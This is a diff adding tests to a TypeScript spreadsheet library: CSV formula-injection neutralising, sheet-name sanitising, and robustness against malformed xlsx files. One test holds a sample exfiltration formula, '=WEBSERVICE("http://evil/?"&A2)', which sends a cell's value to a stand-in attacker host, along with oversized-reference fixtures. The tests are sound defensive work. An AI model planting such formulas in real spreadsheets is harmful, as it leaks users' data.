@@ -15,6 +15,7 @@ import {
   parseCsv,
   parseSharedStrings,
   readXlsx,
+  sheetName,
   sniffDelimiter,
   writeCsv,
   writeXlsx,
@@ -230,5 +231,75 @@ describe('writeXlsx / readXlsx', () => {
     const { zip } = await import('../src/client/zip');
     const notSheet = await zip([{ name: 'hello.txt', data: new TextEncoder().encode('hi') }]);
     await expect(readXlsx(notSheet)).rejects.toThrow(/not a spreadsheet/i);
+  });
+});
+
+describe('CSV formula-injection safety', () => {
+  it('neutralises a leading = or @ so the value stays text when reopened', () => {
+    expect(writeCsv([['=WEBSERVICE("http://evil/?"&A2)']])).toBe(`"'=WEBSERVICE(""http://evil/?""&A2)"`);
+    expect(writeCsv([['@SUM(A1:A9)']])).toBe(`'@SUM(A1:A9)`);
+  });
+
+  it('never touches ordinary negative numbers, which lead with -', () => {
+    // The reason + and - are deliberately not neutralised: a number never
+    // begins with = or @, but -5 is an everyday value and prefixing it would
+    // corrupt it into text.
+    expect(writeCsv([['-5', '+3.2', '3.14']])).toBe('-5,+3.2,3.14');
+  });
+});
+
+describe('writeXlsx sheet names', () => {
+  it('truncates before escaping, so an entity is never cut in half', () => {
+    const long = 'a'.repeat(30) + '&b';
+    // 30 a's + '&' + 'b' -> slice(0,31) keeps the raw '&', then escapeXml makes
+    // it &amp;. The old order escaped first and sliced through '&amp;'.
+    expect(sheetName(long)).toBe('a'.repeat(30) + '&');
+  });
+
+  it('strips characters Excel forbids and never yields an empty name', () => {
+    expect(sheetName('a/b:c*?[]')).not.toMatch(/[/:*?[\]]/);
+    expect(sheetName('')).toBe('Sheet');
+    expect(sheetName('   ')).toBe('Sheet');
+  });
+
+  it('produces a workbook whose sheet name is well-formed XML', async () => {
+    const xlsx = await writeXlsx({ sheets: [{ name: 'a'.repeat(30) + '&b.csv', rows: [['x']] }] });
+    const parts = await unzip(xlsx);
+    const workbook = new TextDecoder().decode(entry(parts, 'xl/workbook.xml')!);
+    // No bare ampersand: every & is the start of an entity.
+    expect(workbook.match(/&(?!amp;|lt;|gt;|quot;|apos;|#)/)).toBeNull();
+    // And it round-trips back through the reader.
+    const back = await readXlsx(xlsx);
+    expect(back.sheets[0]!.rows[0]![0]).toBe('x');
+  });
+});
+
+describe('malformed xlsx does not crash the reader', () => {
+  it('reads a huge numeric character reference as literal text instead of throwing', () => {
+    expect(parseSharedStrings('<sst><si><t>hi&#xFFFFFFFF;</t></si></sst>')).toEqual(['hi&#xFFFFFFFF;']);
+    expect(parseSharedStrings('<sst><si><t>x&#9999999999;y</t></si></sst>')).toEqual(['x&#9999999999;y']);
+  });
+
+  it('still decodes valid references', () => {
+    expect(parseSharedStrings('<sst><si><t>A&amp;B&#65;&#x42;</t></si></sst>')).toEqual(['A&BAB']);
+  });
+
+  it('ignores a row/cell reference beyond the real grid rather than allocating billions', async () => {
+    const enc = (s: string) => new TextEncoder().encode(s);
+    const { zip } = await import('../src/client/zip');
+    const made = await zip([
+      { name: 'xl/workbook.xml', data: enc('<workbook xmlns:r="r"><sheets><sheet name="S" r:id="rA"/></sheets></workbook>') },
+      { name: 'xl/_rels/workbook.xml.rels', data: enc('<Relationships><Relationship Id="rA" Target="worksheets/sheetA.xml"/></Relationships>') },
+      { name: 'xl/worksheets/sheetA.xml', data: enc(
+        '<worksheet><sheetData>' +
+        '<row r="1073741824"><c r="A1073741824" t="inlineStr"><is><t>far</t></is></c></row>' +
+        '<row r="1"><c r="A1" t="inlineStr"><is><t>ok</t></is></c></row>' +
+        '</sheetData></worksheet>') },
+    ]);
+    const start = performance.now();
+    const back = await readXlsx(made);
+    // The out-of-grid row is dropped; the real row survives; and it did not OOM.
+    expect(back.sheets[0]!.rows[0]).toEqual(['ok']);
+    expect(performance.now() - start).toBeLessThan(500);
   });
 });
